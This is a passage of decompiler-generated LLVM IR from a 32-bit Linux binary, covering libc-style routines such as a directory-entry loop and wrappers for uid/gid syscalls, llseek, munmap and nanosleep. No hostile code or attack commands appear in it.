  %v2_804ccb3 = inttoptr i32 %v1_804cca8 to i32*
  store i32 %v4_804ccad, i32* %v2_804ccb3, align 4
  br label %dec_label_pc_804cd79

dec_label_pc_804ccb7:                             ; preds = %dec_label_pc_804cc6d
  %v0_804cc9d = load i32, i32* @esp, align 4
  %v3_804cc9d = add i32 %v0_804cc9d, 4
  store i32 %tmp14, i32* @esi, align 4
  %v5_804cd69 = add i32 %v5_804cc9b, %v1_804cc8b
  %v5_804cce0 = add i32 %tmp14, %arg3
  store i32 %v1_804cc8b, i32* @ebx, align 4
  store i32 %v5_804cd69, i32* %eax.global-to-local, align 4
  %v7_804cd6c31 = icmp ult i32 %v1_804cc8b, %v5_804cd69
  br i1 %v7_804cd6c31, label %dec_label_pc_804ccd6, label %dec_label_pc_804cd74

dec_label_pc_804ccd6:                             ; preds = %dec_label_pc_804ccb7, %dec_label_pc_804cd18
  %stack_var_-32.037 = phi i32 [ %v3_804cd1b, %dec_label_pc_804cd18 ], [ -1, %dec_label_pc_804ccb7 ]
  %stack_var_-36.036 = phi i32 [ %v3_804cd18, %dec_label_pc_804cd18 ], [ -1, %dec_label_pc_804ccb7 ]
  %v0_804cd2435 = phi i32 [ %v2_804cd64, %dec_label_pc_804cd18 ], [ %v1_804cc8b, %dec_label_pc_804ccb7 ]
  %v1_804cd2934 = phi i32 [ %v2_804cce6, %dec_label_pc_804cd18 ], [ %tmp14, %dec_label_pc_804ccb7 ]
  %v0_804ccf033 = phi i32 [ %v1_804cd5e, %dec_label_pc_804cd18 ], [ %v3_804cc9d, %dec_label_pc_804ccb7 ]
  %v1_804ccd6 = add i32 %v0_804cd2435, 16
  %v2_804ccd6 = inttoptr i32 %v1_804ccd6 to i16*
  %v3_804ccd6 = load i16, i16* %v2_804ccd6, align 2
  %v4_804ccd6 = zext i16 %v3_804ccd6 to i32
  %v1_804ccda = add nuw nsw i32 %v4_804ccd6, 3
  store i32 %v5_804cce0, i32* %eax.global-to-local, align 4
  %v1_804cce3 = and i32 %v1_804ccda, 131068
  store i32 %v1_804cce3, i32* %ecx.global-to-local, align 4
  %v2_804cce6 = add i32 %v1_804cce3, %v1_804cd2934
  %tmp43 = icmp ugt i32 %v2_804cce6, %v5_804cce0
  br i1 %tmp43, label %dec_label_pc_804ccf0, label %dec_label_pc_804cd18

dec_label_pc_804ccf0:                             ; preds = %dec_label_pc_804ccd6
  %v1_804ccf0 = add i32 %v0_804ccf033, -4
  %v2_804ccf0 = inttoptr i32 %v1_804ccf0 to i32*
  store i32 0, i32* %v2_804ccf0, align 4
  %v5_804ccf2 = add i32 %v0_804ccf033, -8
  %v6_804ccf2 = inttoptr i32 %v5_804ccf2 to i32*
  store i32 %stack_var_-32.037, i32* %v6_804ccf2, align 4
  %v5_804ccf5 = add i32 %v0_804ccf033, -12
  %v6_804ccf5 = inttoptr i32 %v5_804ccf5 to i32*
  store i32 %stack_var_-36.036, i32* %v6_804ccf5, align 4
  %v5_804ccf8 = add i32 %v0_804ccf033, -16
  %v6_804ccf8 = inttoptr i32 %v5_804ccf8 to i32*
  store i32 %arg1, i32* %v6_804ccf8, align 4
  %v1_804ccfb = call i32 @function_804ce2a(i32 %v2_804cce6)
  store i32 %v1_804ccfb, i32* %eax.global-to-local, align 4
  %v0_804cd03 = load i32, i32* @esi, align 4
  %v15_804cd03 = icmp eq i32 %v0_804cd03, %tmp14
  %v1_804cd06 = icmp eq i1 %v15_804cd03, false
  br i1 %v1_804cd06, label %dec_label_pc_804cd74, label %dec_label_pc_804cd08

dec_label_pc_804cd08:                             ; preds = %dec_label_pc_804ccf0
  %v1_804cd08 = call i32 @function_804b330(i32 %v2_804cce6)
  store i32 %v1_804cd08, i32* %eax.global-to-local, align 4
  %v1_804cd0d = inttoptr i32 %v1_804cd08 to i32*
  store i32 22, i32* %v1_804cd0d, align 4
  br label %dec_label_pc_804cd79

dec_label_pc_804cd18:                             ; preds = %dec_label_pc_804ccd6
  %v1_804cd18 = add i32 %v0_804cd2435, 8
  %v2_804cd18 = inttoptr i32 %v1_804cd18 to i32*
  %v3_804cd18 = load i32, i32* %v2_804cd18, align 4
  store i32 %v3_804cd18, i32* %eax.global-to-local, align 4
  %v1_804cd1b = add i32 %v0_804cd2435, 12
  %v2_804cd1b = inttoptr i32 %v1_804cd1b to i32*
  %v3_804cd1b = load i32, i32* %v2_804cd1b, align 4
  store i32 %v3_804cd1b, i32* %edx.global-to-local, align 4
  %v1_804cd24 = inttoptr i32 %v0_804cd2435 to i32*
  %v2_804cd24 = load i32, i32* %v1_804cd24, align 4
  store i32 %v2_804cd24, i32* %eax.global-to-local, align 4
  %v1_804cd26 = add i32 %v0_804cd2435, 4
  %v2_804cd26 = inttoptr i32 %v1_804cd26 to i32*
  %v3_804cd26 = load i32, i32* %v2_804cd26, align 4
  store i32 %v3_804cd26, i32* %edx.global-to-local, align 4
  %v2_804cd29 = inttoptr i32 %v1_804cd2934 to i32*
  store i32 %v2_804cd24, i32* %v2_804cd29, align 4
  %v0_804cd2b = load i32, i32* %edx.global-to-local, align 4
  %v1_804cd2b = load i32, i32* @esi, align 4
  %v2_804cd2b = add i32 %v1_804cd2b, 4
  %v3_804cd2b = inttoptr i32 %v2_804cd2b to i32*
  store i32 %v0_804cd2b, i32* %v3_804cd2b, align 4
  %v0_804cd2e = load i32, i32* @ebx, align 4
  %v1_804cd2e = add i32 %v0_804cd2e, 8
  %v2_804cd2e = inttoptr i32 %v1_804cd2e to i32*
  %v3_804cd2e = load i32, i32* %v2_804cd2e, align 4
  store i32 %v3_804cd2e, i32* %eax.global-to-local, align 4
  %v1_804cd31 = add i32 %v0_804cd2e, 12
  %v2_804cd31 = inttoptr i32 %v1_804cd31 to i32*
  %v3_804cd31 = load i32, i32* %v2_804cd31, align 4
  store i32 %v3_804cd31, i32* @edx, align 4
  %v0_804cd34 = load i32, i32* %ecx.global-to-local, align 4
  %v1_804cd34 = trunc i32 %v0_804cd34 to i16
  %v2_804cd34 = load i32, i32* @esi, align 4
  %v3_804cd34 = add i32 %v2_804cd34, 16
  %v4_804cd34 = inttoptr i32 %v3_804cd34 to i16*
  store i16 %v1_804cd34, i16* %v4_804cd34, align 2
  %v0_804cd38 = load i32, i32* %eax.global-to-local, align 4
  %v1_804cd38 = load i32, i32* @esi, align 4
  %v2_804cd38 = add i32 %v1_804cd38, 8
  %v3_804cd38 = inttoptr i32 %v2_804cd38 to i32*
  store i32 %v0_804cd38, i32* %v3_804cd38, align 4
  %v0_804cd3b = load i32, i32* @edx, align 4
  %v1_804cd3b = load i32, i32* @esi, align 4
  %v2_804cd3b = add i32 %v1_804cd3b, 12
  %v3_804cd3b = inttoptr i32 %v2_804cd3b to i32*
  store i32 %v0_804cd3b, i32* %v3_804cd3b, align 4
  %v0_804cd3e = load i32, i32* @ebx, align 4
  %v1_804cd3e = add i32 %v0_804cd3e, 18
  %v2_804cd3e = inttoptr i32 %v1_804cd3e to i8*
  %v3_804cd3e = load i8, i8* %v2_804cd3e, align 1
  %v4_804cd3e = zext i8 %v3_804cd3e to i32
  %v5_804cd3e = load i32, i32* %eax.global-to-local, align 4
  %v6_804cd3e = and i32 %v5_804cd3e, -256
  %v7_804cd3e = or i32 %v6_804cd3e, %v4_804cd3e
  store i32 %v7_804cd3e, i32* %eax.global-to-local, align 4
  %v2_804cd41 = load i32, i32* @esi, align 4
  %v3_804cd41 = add i32 %v2_804cd41, 18
  %v4_804cd41 = inttoptr i32 %v3_804cd41 to i8*
  store i8 %v3_804cd3e, i8* %v4_804cd41, align 1
  %v0_804cd44 = load i32, i32* %eax.global-to-local, align 4
  %v1_804cd44 = load i32, i32* @esp, align 4
  %v2_804cd44 = add i32 %v1_804cd44, -4
  %v3_804cd44 = inttoptr i32 %v2_804cd44 to i32*
  store i32 %v0_804cd44, i32* %v3_804cd44, align 4
  %v0_804cd45 = load i32, i32* @ebx, align 4
  %v1_804cd45 = add i32 %v0_804cd45, 16
  %v2_804cd45 = inttoptr i32 %v1_804cd45 to i16*
  %v3_804cd45 = load i16, i16* %v2_804cd45, align 2
  %v4_804cd45 = zext i16 %v3_804cd45 to i32
  %v1_804cd49 = add nsw i32 %v4_804cd45, -19
  %v2_804cd4c = add i32 %v1_804cd44, -8
  %v3_804cd4c = inttoptr i32 %v2_804cd4c to i32*
  store i32 %v1_804cd49, i32* %v3_804cd4c, align 4
  %v0_804cd4d = load i32, i32* @ebx, align 4
  %v1_804cd4d = add i32 %v0_804cd4d, 19
  %v2_804cd50 = add i32 %v1_804cd44, -12
  %v3_804cd50 = inttoptr i32 %v2_804cd50 to i32*
  store i32 %v1_804cd4d, i32* %v3_804cd50, align 4
  %v0_804cd51 = load i32, i32* @esi, align 4
  %v1_804cd51 = add i32 %v0_804cd51, 19
  store i32 %v1_804cd51, i32* %eax.global-to-local, align 4
  %v2_804cd54 = add i32 %v1_804cd44, -16
  %v3_804cd54 = inttoptr i32 %v2_804cd54 to i32*
  store i32 %v1_804cd51, i32* %v3_804cd54, align 4
  %v3_804cd55 = inttoptr i32 %v2_804cce6 to i16*
  %v4_804cd55 = call i32 @function_804d032(i16* %v3_804cd55, i32 %v3_804cd18, i32 %v3_804cd1b)
  store i32 %v4_804cd55, i32* %eax.global-to-local, align 4
  %v0_804cd5a = load i32, i32* @ebx, align 4
  %v1_804cd5a = add i32 %v0_804cd5a, 16
  %v2_804cd5a = inttoptr i32 %v1_804cd5a to i16*
  %v3_804cd5a = load i16, i16* %v2_804cd5a, align 2
  %v4_804cd5a = zext i16 %v3_804cd5a to i32
  %v0_804cd5e = load i32, i32* @esp, align 4
  %v1_804cd5e = add i32 %v0_804cd5e, 16
  store i32 %v2_804cce6, i32* @esi, align 4
  %v2_804cd64 = add i32 %v4_804cd5a, %v0_804cd5a
  store i32 %v2_804cd64, i32* @ebx, align 4
  store i32 %v5_804cd69, i32* %eax.global-to-local, align 4
  %v7_804cd6c = icmp ult i32 %v2_804cd64, %v5_804cd69
  br i1 %v7_804cd6c, label %dec_label_pc_804ccd6, label %dec_label_pc_804cd74

dec_label_pc_804cd74:                             ; preds = %dec_label_pc_804ccb7, %dec_label_pc_804cd18, %dec_label_pc_804ccf0
  %v0_804cd74 = phi i32 [ %v0_804cd03, %dec_label_pc_804ccf0 ], [ %tmp14, %dec_label_pc_804ccb7 ], [ %v2_804cce6, %dec_label_pc_804cd18 ]
  store i32 %v0_804cd74, i32* %eax.global-to-local, align 4
  %v5_804cd76 = sub i32 %v0_804cd74, %tmp14
  br label %dec_label_pc_804cd79

dec_label_pc_804cd79:                             ; preds = %dec_label_pc_804cd08, %dec_label_pc_804cca8, %dec_label_pc_804cd74
  %storemerge = phi i32 [ %v5_804cd76, %dec_label_pc_804cd74 ], [ -1, %dec_label_pc_804cca8 ], [ -1, %dec_label_pc_804cd08 ]
  store i32 %storemerge, i32* %eax.global-to-local, align 4
  store i32 %v0_804cc72, i32* @ebx, align 4
  store i32 %v0_804cc70, i32* %edi.global-to-local, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v0_804cd74, { 1, 0 }
  uselistorder i32 %v2_804cd64, { 2, 1, 0 }
  uselistorder i32 %v3_804cd1b, { 1, 2, 0 }
  uselistorder i32 %v3_804cd18, { 1, 2, 0 }
  uselistorder i32 %v2_804cce6, { 0, 5, 6, 2, 3, 4, 1 }
  uselistorder i32 %v0_804ccf033, { 3, 2, 1, 0 }
  uselistorder i32 %v0_804cd2435, { 3, 4, 1, 2, 0 }
  uselistorder i32 %v5_804cd69, { 2, 3, 0, 1 }
  uselistorder i32 %v5_804cc9b, { 0, 3, 2, 1, 4 }
  uselistorder i32 %tmp14, { 5, 0, 2, 1, 3, 4 }
  uselistorder i32* %eax.global-to-local, { 15, 1, 14, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 18, 16, 0, 17 }
  uselistorder i32 (i16*, i32, i32)* @function_804d032, { 2, 0, 1, 3 }
  uselistorder i32 19, { 2, 3, 4, 1, 0 }
  uselistorder i32 -256, { 21, 22, 37, 23, 24, 13, 11, 0, 12, 6, 10, 7, 25, 26, 8, 27, 14, 1, 4, 9, 15, 20, 16, 17, 18, 19, 5, 3, 28, 2, 30, 29, 31, 32, 33, 34, 35, 36, 38, 39, 40 }
  uselistorder i32 18, { 4, 5, 6, 1, 2, 3, 0 }
  uselistorder i32 -12, { 0, 3, 34, 35, 21, 22, 23, 15, 16, 17, 12, 13, 14, 26, 20, 10, 7, 8, 9, 27, 28, 24, 25, 18, 1, 19, 11, 4, 5, 32, 33, 6, 2, 29, 30, 31 }
  uselistorder i32 -8, { 0, 3, 53, 54, 55, 32, 21, 22, 23, 33, 15, 16, 17, 34, 12, 13, 14, 35, 36, 26, 37, 38, 20, 39, 40, 10, 41, 7, 8, 9, 42, 27, 28, 43, 24, 25, 18, 1, 19, 49, 11, 44, 45, 46, 47, 48, 50, 51, 4, 52, 5, 6, 2, 29, 30, 31 }
  uselistorder i32* @esp, { 144, 145, 146, 1, 2, 3, 4, 5, 147, 0, 6, 14, 128, 129, 130, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 69, 64, 65, 66, 67, 68, 8, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 9, 87, 88, 89, 90, 91, 92, 93, 94, 95, 133, 134, 135, 136, 137, 138, 7, 139, 140, 141, 142, 143, 127, 96, 131, 132, 97, 98, 99, 100, 101, 10, 102, 103, 104, 105, 11, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124, 125, 126, 148, 149, 150, 151, 152, 153, 191, 154, 173, 174, 155, 156, 157, 158, 159, 160, 161, 162, 163, 164, 165, 166, 167, 168, 169, 170, 171, 172, 175, 176, 177, 178, 179, 180, 181, 182, 183, 184, 185, 186, 187, 188, 189, 190, 13, 12, 192 }
  uselistorder i32 15, { 6, 2, 7, 0, 4, 5, 3, 1 }
  uselistorder i32 -16, { 1, 15, 50, 51, 9, 32, 33, 6, 27, 28, 5, 25, 26, 11, 35, 8, 31, 3, 24, 2, 22, 23, 36, 37, 10, 34, 29, 7, 30, 4, 21, 19, 20, 16, 17, 48, 49, 18, 47, 0, 14, 38, 12, 39, 40, 13, 41, 42, 45, 46, 43, 44 }
  uselistorder i32 30, { 5, 4, 0, 2, 3, 1 }
  uselistorder i32 %arg3, { 0, 3, 2, 1 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_804cd79, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804cd74, { 1, 2, 0 }
  uselistorder label %dec_label_pc_804ccd6, { 1, 0 }
}

define i32 @function_804cd81() local_unnamed_addr {
dec_label_pc_804cd81:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804cd81 = load i32, i32* @ebx, align 4
  store i32 %v0_804cd81, i32* %stack_var_-4, align 4
  %v1_804cd8a = call i32 @int80_syscall(i32 202)
  store i32 %v1_804cd8a, i32* %ebx.global-to-local, align 4
  %tmp7 = icmp ult i32 %v1_804cd8a, -4095
  br i1 %tmp7, label %dec_label_pc_804cda1, label %dec_label_pc_804cd95

dec_label_pc_804cd95:                             ; preds = %dec_label_pc_804cd81
  %v1_804cd95 = call i32 @function_804b330(i32 %v0_804cd81)
  %v0_804cd9a = load i32, i32* %ebx.global-to-local, align 4
  %v1_804cd9a = sub i32 0, %v0_804cd9a
  %v2_804cd9c = inttoptr i32 %v1_804cd95 to i32*
  store i32 %v1_804cd9a, i32* %v2_804cd9c, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  %v2_804cda5.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_804cda1

dec_label_pc_804cda1:                             ; preds = %dec_label_pc_804cd81, %dec_label_pc_804cd95
  %v2_804cda5 = phi i32 [ %v0_804cd81, %dec_label_pc_804cd81 ], [ %v2_804cda5.pre, %dec_label_pc_804cd95 ]
  %v0_804cda2 = phi i32 [ %v1_804cd8a, %dec_label_pc_804cd81 ], [ -1, %dec_label_pc_804cd95 ]
  store i32 %v2_804cda5, i32* @ebx, align 4
  ret i32 %v0_804cda2

; uselistorder directives
  uselistorder i32 %v1_804cd8a, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804cda1, { 1, 0 }
}

define i32 @function_804cda7() local_unnamed_addr {
dec_label_pc_804cda7:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804cda7 = load i32, i32* @ebx, align 4
  store i32 %v0_804cda7, i32* %stack_var_-4, align 4
  %v1_804cdb0 = call i32 @int80_syscall(i32 201)
  store i32 %v1_804cdb0, i32* %ebx.global-to-local, align 4
  %tmp7 = icmp ult i32 %v1_804cdb0, -4095
  br i1 %tmp7, label %dec_label_pc_804cdc7, label %dec_label_pc_804cdbb

dec_label_pc_804cdbb:                             ; preds = %dec_label_pc_804cda7
  %v1_804cdbb = call i32 @function_804b330(i32 %v0_804cda7)
  %v0_804cdc0 = load i32, i32* %ebx.global-to-local, align 4
  %v1_804cdc0 = sub i32 0, %v0_804cdc0
  %v2_804cdc2 = inttoptr i32 %v1_804cdbb to i32*
  store i32 %v1_804cdc0, i32* %v2_804cdc2, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  %v2_804cdcb.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_804cdc7

dec_label_pc_804cdc7:                             ; preds = %dec_label_pc_804cda7, %dec_label_pc_804cdbb
  %v2_804cdcb = phi i32 [ %v0_804cda7, %dec_label_pc_804cda7 ], [ %v2_804cdcb.pre, %dec_label_pc_804cdbb ]
  %v0_804cdc8 = phi i32 [ %v1_804cdb0, %dec_label_pc_804cda7 ], [ -1, %dec_label_pc_804cdbb ]
  store i32 %v2_804cdcb, i32* @ebx, align 4
  ret i32 %v0_804cdc8

; uselistorder directives
  uselistorder i32 %v1_804cdb0, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804cdc7, { 1, 0 }
}

define i32 @function_804cdcd() local_unnamed_addr {
dec_label_pc_804cdcd:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804cdcd = load i32, i32* @ebx, align 4
  store i32 %v0_804cdcd, i32* %stack_var_-4, align 4
  %v1_804cdd6 = call i32 @int80_syscall(i32 200)
  store i32 %v1_804cdd6, i32* %ebx.global-to-local, align 4
  %tmp7 = icmp ult i32 %v1_804cdd6, -4095
  br i1 %tmp7, label %dec_label_pc_804cded, label %dec_label_pc_804cde1

dec_label_pc_804cde1:                             ; preds = %dec_label_pc_804cdcd
  %v1_804cde1 = call i32 @function_804b330(i32 %v0_804cdcd)
  %v0_804cde6 = load i32, i32* %ebx.global-to-local, align 4
  %v1_804cde6 = sub i32 0, %v0_804cde6
  %v2_804cde8 = inttoptr i32 %v1_804cde1 to i32*
  store i32 %v1_804cde6, i32* %v2_804cde8, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  %v2_804cdf1.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_804cded

dec_label_pc_804cded:                             ; preds = %dec_label_pc_804cdcd, %dec_label_pc_804cde1
  %v2_804cdf1 = phi i32 [ %v0_804cdcd, %dec_label_pc_804cdcd ], [ %v2_804cdf1.pre, %dec_label_pc_804cde1 ]
  %v0_804cdee = phi i32 [ %v1_804cdd6, %dec_label_pc_804cdcd ], [ -1, %dec_label_pc_804cde1 ]
  store i32 %v2_804cdf1, i32* %ebx.global-to-local, align 4
  ret i32 %v0_804cdee

; uselistorder directives
  uselistorder i32 %v1_804cdd6, { 1, 0, 2 }
  uselistorder i32* %ebx.global-to-local, { 2, 3, 0, 1 }
  uselistorder label %dec_label_pc_804cded, { 1, 0 }
}

define i32 @function_804cdf3() local_unnamed_addr {
dec_label_pc_804cdf3:
  %v0_804cdf3 = load i32, i32* @global_var_804f6c4.110, align 4
  store i32 %v0_804cdf3, i32* @edx, align 4
  %v1_804cdfe = icmp eq i32 %v0_804cdf3, 0
  %v1_804ce00 = icmp eq i1 %v1_804cdfe, false
  %v4_804ce00 = select i1 %v1_804ce00, i32 %v0_804cdf3, i32 4096
  ret i32 %v4_804ce00

; uselistorder directives
  uselistorder i32 4096, { 0, 1, 8, 2, 5, 6, 7, 3, 4 }
}

define i32 @function_804ce04() local_unnamed_addr {
dec_label_pc_804ce04:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804ce04 = load i32, i32* @ebx, align 4
  store i32 %v0_804ce04, i32* %stack_var_-4, align 4
  %v1_804ce0d = call i32 @int80_syscall(i32 199)
  store i32 %v1_804ce0d, i32* %ebx.global-to-local, align 4
  %tmp7 = icmp ult i32 %v1_804ce0d, -4095
  br i1 %tmp7, label %dec_label_pc_804ce24, label %dec_label_pc_804ce18

dec_label_pc_804ce18:                             ; preds = %dec_label_pc_804ce04
  %v1_804ce18 = call i32 @function_804b330(i32 %v0_804ce04)
  %v0_804ce1d = load i32, i32* %ebx.global-to-local, align 4
  %v1_804ce1d = sub i32 0, %v0_804ce1d
  %v2_804ce1f = inttoptr i32 %v1_804ce18 to i32*
  store i32 %v1_804ce1d, i32* %v2_804ce1f, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  %v2_804ce28.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_804ce24

dec_label_pc_804ce24:                             ; preds = %dec_label_pc_804ce04, %dec_label_pc_804ce18
  %v2_804ce28 = phi i32 [ %v0_804ce04, %dec_label_pc_804ce04 ], [ %v2_804ce28.pre, %dec_label_pc_804ce18 ]
  %v0_804ce25 = phi i32 [ %v1_804ce0d, %dec_label_pc_804ce04 ], [ -1, %dec_label_pc_804ce18 ]
  store i32 %v2_804ce28, i32* %ebx.global-to-local, align 4
  ret i32 %v0_804ce25

; uselistorder directives
  uselistorder i32 %v1_804ce0d, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804ce24, { 1, 0 }
}

define i32 @function_804ce2a(i32 %arg1) local_unnamed_addr {
dec_label_pc_804ce2a:
  %esi.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp8 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-20 = alloca i32, align 4
  %v2_804ce34 = ptrtoint i32* %stack_var_-20 to i32
  store i32 %v2_804ce34, i32* %esi.global-to-local, align 4
  store i32 %tmp8, i32* @ecx, align 4
  %v1_804ce4e = call i32 @int80_syscall(i32 140)
  store i32 %v1_804ce4e, i32* %esi.global-to-local, align 4
  %tmp18 = icmp ult i32 %v1_804ce4e, -4095
  br i1 %tmp18, label %dec_label_pc_804ce68, label %dec_label_pc_804ce5a

dec_label_pc_804ce5a:                             ; preds = %dec_label_pc_804ce2a
  %v1_804ce5a = call i32 @function_804b330(i32 %tmp8)
  %v0_804ce5f = load i32, i32* %esi.global-to-local, align 4
  %v1_804ce5f = sub i32 0, %v0_804ce5f
  %v2_804ce61 = inttoptr i32 %v1_804ce5a to i32*
  store i32 %v1_804ce5f, i32* %v2_804ce61, align 4
  store i32 -1, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_804ce6c

dec_label_pc_804ce68:                             ; preds = %dec_label_pc_804ce2a
  %v1_804ce68 = icmp eq i32 %v1_804ce4e, 0
  br i1 %v1_804ce68, label %dec_label_pc_804ce71, label %dec_label_pc_804ce6c

dec_label_pc_804ce6c:                             ; preds = %dec_label_pc_804ce68, %dec_label_pc_804ce5a
  %v0_804ce6c = phi i32 [ %v1_804ce4e, %dec_label_pc_804ce68 ], [ -1, %dec_label_pc_804ce5a ]
  %v1_804ce6e = ashr i32 %v0_804ce6c, 31
  br label %dec_label_pc_804ce79

dec_label_pc_804ce71:                             ; preds = %dec_label_pc_804ce68
  %v3_804ce71 = load i32, i32* %stack_var_-20, align 4
  br label %dec_label_pc_804ce79

dec_label_pc_804ce79:                             ; preds = %dec_label_pc_804ce6c, %dec_label_pc_804ce71
  %v0_804ce7f = phi i32 [ %v0_804ce6c, %dec_label_pc_804ce6c ], [ %v3_804ce71, %dec_label_pc_804ce71 ]
  %storemerge = phi i32 [ %v1_804ce6e, %dec_label_pc_804ce6c ], [ %tmp, %dec_label_pc_804ce71 ]
  store i32 %storemerge, i32* @edx, align 4
  ret i32 %v0_804ce7f

; uselistorder directives
  uselistorder i32 %v1_804ce4e, { 1, 2, 0, 3 }
  uselistorder i32 31, { 8, 5, 0, 1, 2, 3, 6, 4, 7 }
  uselistorder i32 140, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804ce79, { 1, 0 }
}

define i32 @function_804ce80(i32* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_804ce80:
  %ebx.global-to-local = alloca i32, align 4
  %tmp4 = ptrtoint i32* %arg1 to i32
  %stack_var_-4 = alloca i32, align 4
  %v0_804ce80 = load i32, i32* @ebx, align 4
  store i32 %v0_804ce80, i32* %stack_var_-4, align 4
  store i32 %tmp4, i32* %ebx.global-to-local, align 4
  %v3_804ce93 = call i32 @munmap(i32* %arg1, i32 %arg2)
  store i32 %v3_804ce93, i32* %ebx.global-to-local, align 4
  %tmp10 = icmp ult i32 %v3_804ce93, -4095
  br i1 %tmp10, label %dec_label_pc_804ceac, label %dec_label_pc_804cea0

dec_label_pc_804cea0:                             ; preds = %dec_label_pc_804ce80
  %v1_804cea0 = call i32 @function_804b330(i32 %v0_804ce80)
  %v0_804cea5 = load i32, i32* %ebx.global-to-local, align 4
  %v1_804cea5 = sub i32 0, %v0_804cea5
  %v2_804cea7 = inttoptr i32 %v1_804cea0 to i32*
  store i32 %v1_804cea5, i32* %v2_804cea7, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  %v2_804ceb0.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_804ceac

dec_label_pc_804ceac:                             ; preds = %dec_label_pc_804ce80, %dec_label_pc_804cea0
  %v2_804ceb0 = phi i32 [ %v0_804ce80, %dec_label_pc_804ce80 ], [ %v2_804ceb0.pre, %dec_label_pc_804cea0 ]
  %v0_804cead = phi i32 [ %v3_804ce93, %dec_label_pc_804ce80 ], [ -1, %dec_label_pc_804cea0 ]
  store i32 %v2_804ceb0, i32* %ebx.global-to-local, align 4
  ret i32 %v0_804cead

; uselistorder directives
  uselistorder i32 %v3_804ce93, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804ceac, { 1, 0 }
}

define i32 @function_804ceb2(%timespec* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_804ceb2:
  %ebx.global-to-local = alloca i32, align 4
  %tmp5 = inttoptr i32 %arg2 to %timespec*
  %stack_var_-4 = alloca i32, align 4
  %v0_804ceb2 = load i32, i32* @ebx, align 4
  store i32 %v0_804ceb2, i32* %stack_var_-4, align 4
  %v4_804ceb6 = ptrtoint %timespec* %arg1 to i32
  store i32 %v4_804ceb6, i32* %ebx.global-to-local, align 4
  %v6_804cec5 = call i32 @nanosleep(%timespec* %arg1, %timespec* %tmp5)
  store i32 %v6_804cec5, i32* %ebx.global-to-local, align 4
  %tmp12 = icmp ult i32 %v6_804cec5, -4095
  br i1 %tmp12, label %dec_label_pc_804cede, label %dec_label_pc_804ced2

dec_label_pc_804ced2:                             ; preds = %dec_label_pc_804ceb2
  %v1_804ced2 = call i32 @function_804b330(i32 %v0_804ceb2)
  %v0_804ced7 = load i32, i32* %ebx.global-to-local, align 4
  %v1_804ced7 = sub i32 0, %v0_804ced7
  %v2_804ced9 = inttoptr i32 %v1_804ced2 to i32*
  store i32 %v1_804ced7, i32* %v2_804ced9, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  %v2_804cee2.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_804cede

dec_label_pc_804cede:                             ; preds = %dec_label_pc_804ceb2, %dec_label_pc_804ced2
  %v2_804cee2 = phi i32 [ %v0_804ceb2, %dec_label_pc_804ceb2 ], [ %v2_804cee2.pre, %dec_label_pc_804ced2 ]
  %v0_804cedf = phi i32 [ %v6_804cec5, %dec_label_pc_804ceb2 ], [ -1, %dec_label_pc_804ced2 ]
  store i32 %v2_804cee2, i32* %ebx.global-to-local, align 4
  ret i32 %v0_804cedf

; uselistorder directives
  uselistorder i32 %v6_804cec5, { 1, 0, 2 }
  uselistorder %timespec* %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_804cede, { 1, 0 }
}

define i32 @function_804cee4(i32 %arg1) local_unnamed_addr {
dec_label_pc_804cee4:
  %v0_804cee5 = load i32, i32* @ebx, align 4
  %v0_804cee9 = load i32, i32* @global_var_804f6d8.117, align 8
  %v1_804cee9 = icmp eq i32 %v0_804cee9, 0
  %v1_804cef4 = icmp eq i1 %v1_804cee9, false
  br i1 %v1_804cef4, label %dec_label_pc_804cf07, label %dec_label_pc_804cef6

dec_label_pc_804cef6:                             ; preds = %dec_label_pc_804cee4
  %v1_804cefb = call i32 @function_804d083(i32 0)
  %v2_804cf03 = icmp slt i32 %v1_804cefb, 0
  br i1 %v2_804cf03, label %dec_label_pc_804cf29, label %dec_label_pc_804cef6.dec_label_pc_804cf07_crit_edge

dec_label_pc_804cef6.dec_label_pc_804cf07_crit_edge: ; preds = %dec_label_pc_804cef6
  %v0_804cf09.pre = load i32, i32* @global_var_804f6d8.117, align 8
  br label %dec_label_pc_804cf07

